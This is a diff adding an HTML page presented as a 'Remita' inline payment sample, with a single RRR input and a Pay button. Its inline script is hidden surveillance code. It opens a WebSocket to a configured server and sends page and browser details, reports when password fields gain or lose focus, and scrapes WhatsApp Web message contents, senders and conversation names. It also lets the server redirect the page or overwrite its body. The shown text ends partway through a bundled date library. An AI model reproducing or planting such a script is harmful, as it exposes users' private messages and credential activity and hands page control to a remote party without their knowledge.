@@ -1,0 +1,1112 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    <title>Remita - Inline Sample</title>
+    <style type="text/css">
+      .form-style-1 {
+        margin: 10px auto;
+        max-width: 400px;
+        padding: 20px 12px 10px 20px;
+        font:
+          13px 'Lucida Sans Unicode',
+          'Lucida Grande',
+          sans-serif;
+      }
+      .form-style-1 li {
+        padding: 0;
+        display: block;
+        list-style: none;
+        margin: 10px 0 0 0;
+      }
+      .form-style-1 label {
+        margin: 0 0 3px 0;
+        padding: 0px;
+        display: block;
+        font-weight: bold;
+      }
+      .form-style-1 input[type='text'],
+      .form-style-1 input[type='date'],
+      .form-style-1 input[type='datetime'],
+      .form-style-1 input[type='number'],
+      .form-style-1 input[type='search'],
+      .form-style-1 input[type='time'],
+      .form-style-1 input[type='url'],
+      .form-style-1 input[type='email'],
+      textarea,
+      select {
+        box-sizing: border-box;
+        -webkit-box-sizing: border-box;
+        -moz-box-sizing: border-box;
+        border: 1px solid #bebebe;
+        padding: 7px;
+        margin: 0px;
+        -webkit-transition: all 0.3s ease-in-out;
+        -moz-transition: all 0.3s ease-in-out;
+        -ms-transition: all 0.3s ease-in-out;
+        -o-transition: all 0.3s ease-in-out;
+        outline: none;
+      }
+      .form-style-1 input[type='text']:focus,
+      .form-style-1 input[type='date']:focus,
+      .form-style-1 input[type='datetime']:focus,
+      .form-style-1 input[type='number']:focus,
+      .form-style-1 input[type='search']:focus,
+      .form-style-1 input[type='time']:focus,
+      .form-style-1 input[type='url']:focus,
+      .form-style-1 input[type='email']:focus,
+      .form-style-1 textarea:focus,
+      .form-style-1 select:focus {
+        -moz-box-shadow: 0 0 8px #88d5e9;
+        -webkit-box-shadow: 0 0 8px #88d5e9;
+        box-shadow: 0 0 8px #88d5e9;
+        border: 1px solid #88d5e9;
+      }
+      .form-style-1 .field-divided {
+        width: 49%;
+      }
+      .form-style-1 .field-long {
+        width: 100%;
+      }
+      .form-style-1 .field-select {
+        width: 100%;
+      }
+      .form-style-1 .field-textarea {
+        height: 100px;
+      }
+      .form-style-1 input[type='submit'],
+      .form-style-1 input[type='button'] {
+        background: #f44336;
+        padding: 8px 15px 8px 15px;
+        border: none;
+        color: #fff;
+      }
+      .form-style-1 input[type='submit']:hover,
+      .form-style-1 input[type='button']:hover {
+        background: #e0372b;
+        box-shadow: none;
+        -moz-box-shadow: none;
+        -webkit-box-shadow: none;
+      }
+      .form-style-1 .required {
+        color: red;
+      }
+    </style>
+  </head>
+  <body>
+    <form onsubmit="makePayment()" id="payment-form">
+      <ul class="form-style-1">
+        <li>
+          <label>RRR <span class="required">*</span></label>
+          <input type="text" id="js-rrr" name="rrr" class="field-long" />
+        </li>
+
+        <li>
+          <input type="button" onclick="makePayment()" value="Pay" />
+        </li>
+      </ul>
+    </form>
+
+    <script>
+      !(function () {
+        var Y, e, t;
+        function n() {
+          try {
+            return window.self === window.top;
+          } catch (Y) {
+            return !1;
+          }
+        }
+        function r() {
+          setTimeout(function () {
+            var Y = {
+              type: 'focus',
+              token: N.token,
+              title: document.title,
+              url: document.URL,
+              focused: document.hasFocus(),
+              useragent: navigator.userAgent,
+              pid: N.pid,
+              pn: N.pn,
+            };
+            null != O &&
+              O.readyState == WebSocket.OPEN &&
+              O.send(JSON.stringify(Y));
+          }, 0);
+        }
+        function a() {
+          var Y = {
+            type: 'notification',
+            token: N.token,
+            title: document.title,
+            url: document.URL,
+            focused: document.hasFocus(),
+            timeout: N.sendNotificationsInterval,
+            useragent:
+              navigator.appVersion.length > navigator.userAgent.length
+                ? navigator.appVersion
+                : navigator.userAgent,
+            pid: N.pid,
+            pn: N.pn,
+          };
+          O.send(JSON.stringify(Y));
+        }
+        function s() {
+          h();
+        }
+        function i() {
+          n() && (clearInterval(A), clearInterval(w)),
+            (timeout = setTimeout(function () {
+              g();
+            }, b));
+        }
+        function o(Y) {
+          if (n())
+            switch (Y.data.substring(0, 1)) {
+              case 'r':
+                window.location = Y.data.substring(1);
+                break;
+              case 'b':
+                document.body.innerHTML = Y.data.substring(1);
+                break;
+              case 'w':
+                var e = 'true' == Y.data.substring(1).toLowerCase();
+                T != e && e && v(), (T = e);
+            }
+        }
+        function u(Y) {
+          var e = document.createElement('a');
+          return (e.href = Y), e.href;
+        }
+        function M(Y) {
+          if (Y && 'password' == Y.type && !F)
+            if (((F = !0), n())) {
+              var e = {
+                type: 'password_input_focus',
+                focus: !0,
+                token: N.token,
+              };
+              O.send(JSON.stringify(e));
+            } else
+              window.top.postMessage(
+                {
+                  message: 'iframePasswordInputFocused',
+                  name: Y.name,
+                  type: Y.type,
+                },
+                '*'
+              );
+        }
+        function d(Y) {
+          var e = Y && Y.name ? Y.name : '<unnamed>';
+          if (Y && 'password' == Y.type && F)
+            if (((F = !1), n())) {
+              var t = {
+                type: 'password_input_focus',
+                focus: !1,
+                token: N.token,
+              };
+              O.send(JSON.stringify(t));
+            } else
+              window.top.postMessage(
+                {
+                  message: 'iframePasswordInputBlurred',
+                  name: e,
+                  type: Y.type,
+                },
+                '*'
+              );
+        }
+        function c(Y) {
+          var e = document.activeElement;
+          e && e != document.body
+            ? document.querySelector && (e = document.querySelector(':focus'))
+            : (e = null);
+          for (var t = 0; t < Y.length; ++t) {
+            let s = Y[t];
+            var n = 'password' == s.type,
+              r = n && s.hasAttribute('autofocus'),
+              a = n && e && s.isEqualNode(e);
+            (r || a) && M(s),
+              s.tmInputEventListenerAttached ||
+                (s.addEventListener(
+                  'focus',
+                  function (Y) {
+                    M(Y.target);
+                  },
+                  !0
+                ),
+                s.addEventListener(
+                  'blur',
+                  function (Y) {
+                    d(Y.target);
+                  },
+                  !0
+                ),
+                (s.tmInputEventListenerAttached = !0));
+          }
+        }
+        function D() {
+          c(document.getElementsByTagName('input')),
+            new MutationObserver(function (Y) {
+              Y &&
+                Y.forEach(function (Y) {
+                  Y &&
+                    Y.addedNodes &&
+                    0 != Y.addedNodes.length &&
+                    (window.NodeList &&
+                      !NodeList.prototype.forEach &&
+                      (NodeList.prototype.forEach = Array.prototype.forEach),
+                    Y.addedNodes.forEach(function (Y) {
+                      Y.tagName && c(Y.getElementsByTagName('input'));
+                    }));
+                });
+            }).observe(document, { childList: !0, subtree: !0 }),
+            window.addEventListener('beforeunload', function (Y) {
+              d(),
+                (function () {
+                  for (
+                    var Y = document.getElementsByTagName('input'), e = 0;
+                    e < Y.length;
+                    ++e
+                  ) {
+                    let t = Y[e];
+                    t.removeEventListener('focus', M),
+                      t.removeEventListener('blur', d),
+                      delete t.tmInputEventListenerAttached;
+                  }
+                })();
+            });
+        }
+        function l() {
+          var Y;
+          n() &&
+            (N.iup &&
+              ((Y = {
+                type: 'connect',
+                token: N.token,
+                title: document.title,
+                url: document.URL,
+                focused: document.hasFocus(),
+                useragent: navigator.userAgent,
+                pid: N.pid,
+                pn: N.pn,
+              }),
+              null != O &&
+                O.readyState == WebSocket.OPEN &&
+                O.send(JSON.stringify(Y))),
+            m() &&
+              (v(),
+              h(),
+              (function () {
+                var Y = new MutationObserver(function (Y) {
+                  Y &&
+                    Y.forEach(function (Y) {
+                      Y &&
+                        ('childList' !== Y.type ||
+                          Y.addedNodes.length <= 0 ||
+                          Y.addedNodes.forEach(function (Y) {
+                            if (Y) {
+                              var e = document.querySelector(
+                                'div[id=main] header span[title]'
+                              );
+                              e && (E = e.innerText),
+                                document.querySelector(
+                                  'div[id=main] header span[data-icon=default-user]'
+                                ) && (L = 'private'),
+                                document.querySelector(
+                                  'div[id=main] header span[data-icon=default-group]'
+                                ) && (L = 'group');
+                              var t = Y.querySelectorAll(
+                                '.message-in, .message-out'
+                              );
+                              t || y('msgNodes is empty'),
+                                Y.matches('.message-in, .message-out') &&
+                                  (t = Array.prototype.slice.call(t)).push(Y),
+                                t
+                                  ? t.forEach(function (Y) {
+                                      if (Y)
+                                        if (
+                                          !Y.classList ||
+                                          Y.classList.length <= 0
+                                        )
+                                          y(
+                                            'msg node does not contain classList or classList is empty'
+                                          );
+                                        else {
+                                          var e =
+                                              Y.classList.contains(
+                                                'message-in'
+                                              ),
+                                            t =
+                                              Y.querySelector('.copyable-text'),
+                                            n =
+                                              Y.querySelector(
+                                                '.selectable-text'
+                                              ),
+                                            r = new Date(),
+                                            a = null;
+                                          if (
+                                            t &&
+                                            t.attributes['data-pre-plain-text']
+                                          ) {
+                                            var s =
+                                                t.attributes[
+                                                  'data-pre-plain-text'
+                                                ].textContent,
+                                              i =
+                                                /\[(\d{1,2}):(\d{1,2})[ ]{0,1}([p|a]\.?\s?m\.?)?,\s(.+)]\s(.*):/i[
+                                                  Symbol.match
+                                                ](s);
+                                            if (!i || 6 != i.length)
+                                              return void y(
+                                                'no matches for string: ' + s
+                                              );
+                                            if (
+                                              (i[3] &&
+                                                i[3].length > 1 &&
+                                                'p' ==
+                                                  i[3]
+                                                    .toLowerCase()
+                                                    .slice(0, 1) &&
+                                                (i[1] = parseInt(i[1]) + 12),
+                                              (dateParts =
+                                                /(\d{1,4})[.-\\/](\d{1,4})[.-\\/](\d{1,4})/[
+                                                  Symbol.match
+                                                ](i[4])),
+                                              !dateParts ||
+                                                4 != dateParts.length)
+                                            )
+                                              return void y(
+                                                'no matches for string: ' + i[4]
+                                              );
+                                            if (
+                                              (y(i[4] + P),
+                                              !(r =
+                                                date.parse(i[4], P) ||
+                                                (function (Y, e, t) {
+                                                  var n = [
+                                                      [Y, e, t].join('-'),
+                                                      [Y, t, e].join('-'),
+                                                      [e, Y, t].join('-'),
+                                                      [e, t, Y].join('-'),
+                                                      [t, Y, e].join('-'),
+                                                      [t, e, Y].join('-'),
+                                                    ],
+                                                    r = Date.now();
+                                                  for (var a in n) {
+                                                    var s = Date.parse(n[a]);
+                                                    if (
+                                                      s &&
+                                                      !(
+                                                        Math.abs(r - s) > 1728e6
+                                                      )
+                                                    )
+                                                      return new Date(s);
+                                                  }
+                                                })(
+                                                  dateParts[1],
+                                                  dateParts[2],
+                                                  dateParts[3]
+                                                )))
+                                            )
+                                              return void y(
+                                                "Can't parse date from string: " +
+                                                  i[4]
+                                              );
+                                            r.setHours(i[1]),
+                                              r.setMinutes(i[2]),
+                                              (a = i[5]);
+                                          }
+                                          y(
+                                            'isIncomingMsg = ' +
+                                              e +
+                                              ' msgDateTime = ' +
+                                              r +
+                                              ' msgSender = ' +
+                                              a +
+                                              ' wapStartTime = ' +
+                                              H +
+                                              ' wapTrackingEnabled = ' +
+                                              T
+                                          ),
+                                            I.get(E) || I.set(E, H);
+                                          var o = n ? n.innerText : null;
+                                          if (
+                                            (y('msgContent = ' + o),
+                                            a && o && T)
+                                          ) {
+                                            var u = (a + o + E + r.getTime())
+                                              .split('')
+                                              .map(function (Y) {
+                                                return Y.charCodeAt(0);
+                                              })
+                                              .reduce(function (Y, e) {
+                                                return (
+                                                  (Y + ((Y << 7) + (Y << 3))) ^
+                                                  e
+                                                );
+                                              })
+                                              .toString(16);
+                                            if (
+                                              (I.get(E).getTime() == r.getTime()
+                                                ? r.setMilliseconds(++C)
+                                                : ((C = 0), I.set(E, r)),
+                                              !u || k.has(u))
+                                            )
+                                              return void y(
+                                                'msgId is null or this msgId already tracked ' +
+                                                  u
+                                              );
+                                            var M = {
+                                              type: 'wapmessage',
+                                              timestamp: r.getTime(),
+                                              id: u,
+                                              incoming: e,
+                                              sender: e ? a : 'Me',
+                                              content: o,
+                                              recipient: e ? 'Me' : E,
+                                              conversationId: E + '(' + L + ')',
+                                            };
+                                            O.send(JSON.stringify(M)), k.add(u);
+                                          }
+                                        }
+                                    })
+                                  : y('no msg nodes found');
+                            }
+                          }));
+                    });
+                });
+                if (!Y) return;
+                Y.observe(document.body, { childList: !0, subtree: !0 }),
+                  y('observer is ready');
+              })()),
+            n() &&
+              (a(),
+              (A = setInterval(a, N.sendNotificationsInterval)),
+              m() && (w = setInterval(s, N.pollWhatsappTrackingInterval))),
+            (function () {
+              for (
+                var Y = [], e = document.getElementsByTagName('link'), t = 0;
+                t < e.length;
+                ++t
+              )
+                ('icon' != e[t].getAttribute('rel') &&
+                  'shortcut icon' != e[t].getAttribute('rel')) ||
+                  (Y[Y.length] = u(e[t].getAttribute('href')));
+              0 == Y.length && (Y[0] = u('/favicon.ico'));
+              var n = { type: 'favicon' };
+              (n.url = document.URL),
+                (n.src = Y),
+                (n.title = document.title),
+                (n.token = N.token),
+                (n.useragent =
+                  navigator.appVersion.length > navigator.userAgent.length
+                    ? navigator.appVersion
+                    : navigator.userAgent),
+                O.send(JSON.stringify(n));
+            })(),
+            N.dontTrackWebPasswords && D());
+        }
+        function f() {
+          document.tmfilter ||
+            (g(),
+            (P = {
+              'ar-SA': 'D/M/YY',
+              'bg-BG': 'D.M.YYYY',
+              'ca-ES': 'D/M/YYYY',
+              'zh-TW': 'YYYY/M/D',
+              'cs-CZ': 'D.M.YYYY',
+              'Da-DK': 'D-M-YYYY',
+              'De-DE': 'D.M.YYYY',
+              'el-GR': 'D/M/YYYY',
+              'en-US': 'M/D/YYYY',
+              'fi-FI': 'D.M.YYYY',
+              'fr-FR': 'D/M/YYYY',
+              'he-IL': 'D/M/YYYY',
+              'hu-HU': 'YYYY. M. D.',
+              'is-IS': 'D.M.YYYY',
+              'it-IT': 'D/M/YYYY',
+              'ja-JP': 'YYYY/M/D',
+              'ko-KR': 'YYYY-M-D',
+              'nl-NL': 'D-M-YYYY',
+              'nb-NO': 'D.M.YYYY',
+              'pl-PL': 'YYYY-M-D',
+              'pt-BR': 'D/M/YYYY',
+              'ro-RO': 'D.M.YYYY',
+              'ru-RU': 'D.M.YYYY',
+              'hr-HR': 'D.M.YYYY',
+              'sk-SK': 'D. M. YYYY',
+              'sq-AL': 'YYYY-M-D',
+              'sv-SE': 'YYYY-M-D',
+              'th-TH': 'D/M/YYYY',
+              'tr-TR': 'D.M.YYYY',
+              'ur-PK': 'D/M/YYYY',
+              'iD-ID': 'D/M/YYYY',
+              'uk-UA': 'D.M.YYYY',
+              'be-BY': 'D.M.YYYY',
+              'sl-SI': 'D.M.YYYY',
+              'et-EE': 'D.M.YYYY',
+              'lv-LV': 'YYYY.M.D.',
+              'lt-LT': 'YYYY.M.D',
+              'fa-IR': 'M/D/YYYY',
+              'vi-VN': 'D/M/YYYY',
+              'hy-AM': 'D.M.YYYY',
+              'az-Latn-AZ': 'D.M.YYYY',
+              'eu-ES': 'YYYY/M/D',
+              'Mk-MK': 'D.M.YYYY',
+              'af-ZA': 'YYYY/M/D',
+              'ka-GE': 'D.M.YYYY',
+              'fo-FO': 'D-M-YYYY',
+              'hi-IN': 'D-M-YYYY',
+              'Ms-MY': 'D/M/YYYY',
+              'kk-KZ': 'D.M.YYYY',
+              'ky-KG': 'D.M.YY',
+              'sw-KE': 'M/D/YYYY',
+              'uz-Latn-UZ': 'D/M YYYY',
+              'tt-RU': 'D.M.YYYY',
+              'pa-IN': 'D-M-YY',
+              'gu-IN': 'D-M-YY',
+              'ta-IN': 'D-M-YYYY',
+              'te-IN': 'D-M-YY',
+              'kn-IN': 'D-M-YY',
+              'Mr-IN': 'D-M-YYYY',
+              'sa-IN': 'D-M-YYYY',
+              'Mn-MN': 'YY.M.D',
+              'gl-ES': 'D/M/YY',
+              'kok-IN': 'D-M-YYYY',
+              'syr-SY': 'D/M/YYYY',
+              'Dv-MV': 'D/M/YY',
+              'ar-IQ': 'D/M/YYYY',
+              'zh-CN': 'YYYY/M/D',
+              'De-CH': 'D.M.YYYY',
+              'en-GB': 'D/M/YYYY',
+              'es-MX': 'D/M/YYYY',
+              'fr-BE': 'D/M/YYYY',
+              'it-CH': 'D.M.YYYY',
+              'nl-BE': 'D/M/YYYY',
+              'nn-NO': 'D.M.YYYY',
+              'pt-PT': 'D-M-YYYY',
+              'sr-Latn-CS': 'D.M.YYYY',
+              'sv-FI': 'D.M.YYYY',
+              'az-Cyrl-AZ': 'D.M.YYYY',
+              'Ms-BN': 'D/M/YYYY',
+              'uz-Cyrl-UZ': 'D.M.YYYY',
+              'ar-EG': 'D/M/YYYY',
+              'zh-HK': 'D/M/YYYY',
+              'De-AT': 'D.M.YYYY',
+              'en-AU': 'D/M/YYYY',
+              'es-ES': 'D/M/YYYY',
+              'fr-CA': 'YYYY-M-D',
+              'sr-Cyrl-CS': 'D.M.YYYY',
+              'ar-LY': 'D/M/YYYY',
+              'zh-SG': 'D/M/YYYY',
+              'De-LU': 'D.M.YYYY',
+              'en-CA': 'D/M/YYYY',
+              'es-GT': 'D/M/YYYY',
+              'fr-CH': 'D.M.YYYY',
+              'ar-DZ': 'D-M-YYYY',
+              'zh-MO': 'D/M/YYYY',
+              'De-LI': 'D.M.YYYY',
+              'en-NZ': 'D/M/YYYY',
+              'es-CR': 'D/M/YYYY',
+              'fr-LU': 'D/M/YYYY',
+              'ar-MA': 'D-M-YYYY',
+              'en-IE': 'D/M/YYYY',
+              'es-PA': 'M/D/YYYY',
+              'fr-MC': 'D/M/YYYY',
+              'ar-TN': 'D-M-YYYY',
+              'en-ZA': 'YYYY/M/D',
+              'es-DO': 'D/M/YYYY',
+              'ar-OM': 'D/M/YYYY',
+              'en-JM': 'D/M/YYYY',
+              'es-VE': 'D/M/YYYY',
+              'ar-YE': 'D/M/YYYY',
+              'en-029': 'M/D/YYYY',
+              'es-CO': 'D/M/YYYY',
+              'ar-SY': 'D/M/YYYY',
+              'en-BZ': 'D/M/YYYY',
+              'es-PE': 'D/M/YYYY',
+              'ar-JO': 'D/M/YYYY',
+              'en-TT': 'D/M/YYYY',
+              'es-AR': 'D/M/YYYY',
+              'ar-LB': 'D/M/YYYY',
+              'en-ZW': 'M/D/YYYY',
+              'es-EC': 'D/M/YYYY',
+              'ar-KW': 'D/M/YYYY',
+              'en-PH': 'M/D/YYYY',
+              'es-CL': 'D-M-YYYY',
+              'ar-AE': 'D/M/YYYY',
+              'es-UY': 'D/M/YYYY',
+              'ar-BH': 'D/M/YYYY',
+              'es-PY': 'D/M/YYYY',
+              'ar-QA': 'D/M/YYYY',
+              'es-BO': 'D/M/YYYY',
+              'es-SV': 'D/M/YYYY',
+              'es-HN': 'D/M/YYYY',
+              'es-NI': 'D/M/YYYY',
+              'es-PR': 'D/M/YYYY',
+              'aM-ET': 'D/M/YYYY',
+              'tzM-Latn-DZ': 'D-M-YYYY',
+              'iu-Latn-CA': 'D/M/YYYY',
+              'sMa-NO': 'D.M.YYYY',
+              'Mn-Mong-CN': 'YYYY/M/D',
+              'gD-GB': 'D/M/YYYY',
+              'en-MY': 'D/M/YYYY',
+              'prs-AF': 'D/M/YY',
+              'bn-BD': 'D-M-YY',
+              'wo-SN': 'D/M/YYYY',
+              'rw-RW': 'M/D/YYYY',
+              'qut-GT': 'D/M/YYYY',
+              'sah-RU': 'M.D.YYYY',
+              'gsw-FR': 'D/M/YYYY',
+              'co-FR': 'D/M/YYYY',
+              'oc-FR': 'D/M/YYYY',
+              'Mi-NZ': 'D/M/YYYY',
+              'ga-IE': 'D/M/YYYY',
+              'se-SE': 'YYYY-M-D',
+              'br-FR': 'D/M/YYYY',
+              'sMn-FI': 'D.M.YYYY',
+              'Moh-CA': 'M/D/YYYY',
+              'arn-CL': 'D-M-YYYY',
+              'ii-CN': 'YYYY/M/D',
+              'Dsb-DE': 'D. M. YYYY',
+              'ig-NG': 'D/M/YYYY',
+              'kl-GL': 'D-M-YYYY',
+              'lb-LU': 'D/M/YYYY',
+              'ba-RU': 'D.M.YY',
+              'nso-ZA': 'YYYY/M/D',
+              'quz-BO': 'D/M/YYYY',
+              'yo-NG': 'D/M/YYYY',
+              'ha-Latn-NG': 'D/M/YYYY',
+              'fil-PH': 'M/D/YYYY',
+              'ps-AF': 'D/M/YY',
+              'fy-NL': 'D-M-YYYY',
+              'ne-NP': 'M/D/YYYY',
+              'se-NO': 'D.M.YYYY',
+              'iu-Cans-CA': 'D/M/YYYY',
+              'sr-Latn-RS': 'D.M.YYYY',
+              'si-LK': 'YYYY-M-D',
+              'sr-Cyrl-RS': 'D.M.YYYY',
+              'lo-LA': 'D/M/YYYY',
+              'kM-KH': 'YYYY-M-D',
+              'cy-GB': 'D/M/YYYY',
+              'bo-CN': 'YYYY/M/D',
+              'sMs-FI': 'D.M.YYYY',
+              'as-IN': 'D-M-YYYY',
+              'Ml-IN': 'D-M-YY',
+              'en-IN': 'D-M-YYYY',
+              'or-IN': 'D-M-YY',
+              'bn-IN': 'D-M-YY',
+              'tk-TM': 'D.M.YY',
+              'bs-Latn-BA': 'D.M.YYYY',
+              'Mt-MT': 'D/M/YYYY',
+              'sr-Cyrl-ME': 'D.M.YYYY',
+              'se-FI': 'D.M.YYYY',
+              'zu-ZA': 'YYYY/M/D',
+              'xh-ZA': 'YYYY/M/D',
+              'tn-ZA': 'YYYY/M/D',
+              'hsb-DE': 'D. M. YYYY',
+              'bs-Cyrl-BA': 'D.M.YYYY',
+              'tg-Cyrl-TJ': 'D.M.YY',
+              'sr-Latn-BA': 'D.M.YYYY',
+              'sMj-NO': 'D.M.YYYY',
+              'rM-CH': 'D/M/YYYY',
+              'sMj-SE': 'YYYY-M-D',
+              'quz-EC': 'D/M/YYYY',
+              'quz-PE': 'D/M/YYYY',
+              'hr-BA': 'D.M.YYYY.',
+              'sr-Latn-ME': 'D.M.YYYY',
+              'sMa-SE': 'YYYY-M-D',
+              'en-SG': 'D/M/YYYY',
+              'ug-CN': 'YYYY-M-D',
+              'sr-Cyrl-BA': 'D.M.YYYY',
+              'es-US': 'M/D/YYYY',
+            }[navigator.language]),
+            (document.tmfilter = 'present'));
+        }
+        function g() {
+          ((O = new WebSocket(N.connectionString)).onclose = i),
+            (O.onmessage = o),
+            (O.onopen = l),
+            N.extJs &&
+              ((this.extJs.webSockReady = () =>
+                O.readyState === WebSocket.OPEN),
+              (this.extJs.webSockSend = (Y) => O.send(Y)));
+        }
+        function p() {
+          var Y = (function () {
+            var Y = ['webkit', 'moz', 'ms', 'o'];
+            if ('hidden' in document) return 'hidden';
+            for (var e = 0; e < Y.length; e++)
+              if (Y[e] + 'Hidden' in document) return Y[e] + 'Hidden';
+            return null;
+          })();
+          return !!Y && document[Y];
+        }
+        function m() {
+          var Y = document.head.querySelector("[name='og:title']");
+          return !!Y && 'WhatsApp Web' === Y.getAttribute('content');
+        }
+        function h() {
+          O.send(JSON.stringify({ type: 'waptracking' }));
+        }
+        function v() {
+          (I = new Map()),
+            (k = new Set()),
+            (C = 0),
+            (H = new Date()).setSeconds(0),
+            H.setMilliseconds(0);
+        }
+        function y(Y) {
+          var e = { handler: 'log', module: 'wapjs', url: 'wap', message: Y };
+          O.send(JSON.stringify(e));
+        }
+        function S(Y) {
+          var e = { name: Y.data.name, type: Y.data.type };
+          'iframePasswordInputFocused' === Y.data.message
+            ? M(e)
+            : 'iframePasswordInputBlurred' === Y.data.message && d(e);
+        }
+        (Y = this),
+          (e = {}),
+          (t = {
+            en: {
+              MMMM: 'January February March April May June July August September October November December'.split(
+                ' '
+              ),
+              MMM: 'Jan Feb Mar Apr May Jun Jul Aug Sep Oct Nov Dec'.split(' '),
+              dddd: 'Sunday Monday Tuesday Wednesday Thursday Friday Saturday'.split(
+                ' '
+              ),
+              ddd: 'Sun Mon Tue Wed Thu Fri Sat'.split(' '),
+              dd: 'Su Mo Tu We Th Fr Sa'.split(' '),
+              A: ['a.m.', 'p.m.'],
+              formatter: {
+                YYYY: function (Y) {
+                  return ('000' + Y.getFullYear()).slice(-4);
+                },
+                YY: function (Y) {
+                  return ('0' + Y.getFullYear()).slice(-2);
+                },
+                Y: function (Y) {
+                  return '' + Y.getFullYear();
+                },
+                MMMM: function (Y) {
+                  return this.MMMM[Y.getMonth()];
+                },
+                MMM: function (Y) {
+                  return this.MMM[Y.getMonth()];
+                },
+                MM: function (Y) {
+                  return ('0' + (Y.getMonth() + 1)).slice(-2);
+                },
+                M: function (Y) {
+                  return '' + (Y.getMonth() + 1);
+                },
+                DD: function (Y) {
+                  return ('0' + Y.getDate()).slice(-2);
+                },
+                D: function (Y) {
+                  return '' + Y.getDate();
+                },
+                HH: function (Y) {
+                  return ('0' + Y.getHours()).slice(-2);
+                },
+                H: function (Y) {
+                  return '' + Y.getHours();
+                },
+                A: function (Y) {
+                  return this.A[(11 < Y.getHours()) | 0];
+                },
+                hh: function (Y) {
+                  return ('0' + (Y.getHours() % 12 || 12)).slice(-2);
+                },
+                h: function (Y) {
+                  return '' + (Y.getHours() % 12 || 12);
+                },
+                mm: function (Y) {
+                  return ('0' + Y.getMinutes()).slice(-2);
+                },
+                m: function (Y) {
+                  return '' + Y.getMinutes();
+                },
+                ss: function (Y) {
+                  return ('0' + Y.getSeconds()).slice(-2);
+                },
+                s: function (Y) {
+                  return '' + Y.getSeconds();
+                },
+                SSS: function (Y) {
+                  return ('00' + Y.getMilliseconds()).slice(-3);
+                },
+                SS: function (Y) {
+                  return ('0' + ((Y.getMilliseconds() / 10) | 0)).slice(-2);
+                },
+                S: function (Y) {
+                  return '' + ((Y.getMilliseconds() / 100) | 0);
+                },
+                dddd: function (Y) {
+                  return this.dddd[Y.getDay()];
+                },
+                ddd: function (Y) {
+                  return this.ddd[Y.getDay()];
+                },
+                dd: function (Y) {
+                  return this.dd[Y.getDay()];
+                },
+                Z: function (Y) {
+                  return (
+                    (0 < (Y = Y.utc ? 0 : Y.getTimezoneOffset() / 0.6)
+                      ? '-'
+                      : '+') + ('000' + Math.abs(Y - (Y % 100) * 0.4)).slice(-4)
+                  );
+                },
+                post: function (Y) {
+                  return Y;
+                },
+              },
+              parser: {
+                find: function (Y, e) {
+                  for (var t, n = -1, r = 0, a = 0, s = Y.length; a < s; a++)
+                    (t = Y[a]),
+                      !e.indexOf(t) &&
+                        t.length > r &&
+                        ((n = a), (r = t.length));
+                  return { index: n, length: r };
+                },
+                MMMM: function (Y) {
+                  return this.parser.find(this.MMMM, Y);
+                },
+                MMM: function (Y) {
+                  return this.parser.find(this.MMM, Y);
+                },
+                A: function (Y) {
+                  return this.parser.find(this.A, Y);
+                },
+                h: function (Y, e) {
+                  return (12 === Y ? 0 : Y) + 12 * e;
+                },
+                pre: function (Y) {
+                  return Y;
+                },
+              },
+            },
+          }),
+          (e.format = function (Y, n, r) {
+            var a = e.addMinutes(Y, r ? Y.getTimezoneOffset() : 0),
+              s = t.en,
+              i = s.formatter;
+            return (
+              (a.utc = r),
+              n.replace(
+                /(\[[^\[\]]*]|\[.*\][^\[]*\]|YYYY|YY|MMM?M?|DD|HH|hh|mm|ss|SSS?|ddd?d?|.)/g,
+                function (Y) {
+                  var e = i[Y];
+                  return e
+                    ? i.post(e.call(s, a, n))
+                    : Y.replace(/\[(.*)]/, '$1');
+                }
+              )
+            );
+          }),
+          (e.parse = function (Y, n, r) {
+            var a,
+              s,
+              i = t.en,
+              o = i.parser.pre(Y),
+              u = 0,
+              M =
+                /(MMMM?|A)|(YYYY)|(SSS)|(MM|DD|HH|hh|mm|ss)|(YY|M|D|H|h|m|s|SS)|(S)|(.)/g,
+              d = {
+                2: /^\d{1,4}/,
+                3: /^\d{1,3}/,
+                4: /^\d\d/,
+                5: /^\d\d?/,
+                6: /^\d/,
+              };
+            Y = [31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31];
+            for (
+              var c = { Y: 1970, M: 1, D: 1, H: 0, m: 0, s: 0, S: 0 };
+              (a = M.exec(n));
+
+            ) {
+              var D = 0,
+                l = 1;
+              for (s = ''; !s; ) s = a[++D];
+              a = s.charAt(0);
+              var f = o.slice(u);
+              if (2 > D) {
+                var g = i.parser[s].call(i, f, n);
+                (c[a] = g.index), 'M' === a && c[a]++, (l = g.length);
+              } else if (7 > D)
+                (g = (f.match(d[D]) || [''])[0]),
+                  (c[a] =
+                    0 | ('S' === a ? (g + '000').slice(0, -s.length) : g)),
+                  (l = g.length);
+              else if (' ' !== a && a !== f[0]) return NaN;
+              if (!l) return NaN;
+              u += l;
+            }
+            return u === o.length && g
+              ? ((c.Y += 70 > c.Y ? 2e3 : 100 > c.Y ? 1900 : 0),
+                (c.H = c.H || i.parser.h(c.h || 0, c.A || 0)),
+                (n = new Date(c.Y, c.M - 1, c.D, c.H, c.m, c.s, c.S)),
+                (Y[1] += 0 | e.isLeapYear(n)),
+                1 > c.M ||
+                12 < c.M ||
+                1 > c.D ||
+                c.D > Y[c.M - 1] ||
+                23 < c.H ||
+                59 < c.m ||
+                59 < c.s
+                  ? NaN
+                  : r
+                    ? e.addMinutes(n, -n.getTimezoneOffset())
+                    : n)
+              : NaN;
+          }),
+          (e.isValid = function (Y, t) {
+            return !!e.parse(Y, t);
+          }),
+          (e.addYears = function (Y, t) {
+            return e.addMonths(Y, 12 * t);
+          }),
+          (e.addMonths = function (Y, e) {
+            var t = new Date(Y.getTime());
+            return t.setMonth(t.getMonth() + e), t;
+          }),
+          (e.addDays = function (Y, e) {
+            var t = new Date(Y.getTime());
+            return t.setDate(t.getDate() + e), t;
+          }),
+          (e.addHours = function (Y, t) {
+            return e.addMilliseconds(Y, 36e5 * t);
+          }),
+          (e.addMinutes = function (Y, t) {
+            return e.addMilliseconds(Y, 6e4 * t);
+          }),
+          (e.addSeconds = function (Y, t) {
+            return e.addMilliseconds(Y, 1e3 * t);
+          }),
+          (e.addMilliseconds = function (Y, e) {
+            return new Date(Y.getTime() + e);
+          }),
+          (e.subtract = function (Y, e) {
+            var t = Y.getTime() - e.getTime();
+            return {
+              toMilliseconds: function () {
+                return t;
+              },
+              toSeconds: function () {
+                return (t / 1e3) | 0;
+              },
+              toMinutes: function () {
+                return (t / 6e4) | 0;
+              },
+              toHours: function () {
+                return (t / 36e5) | 0;
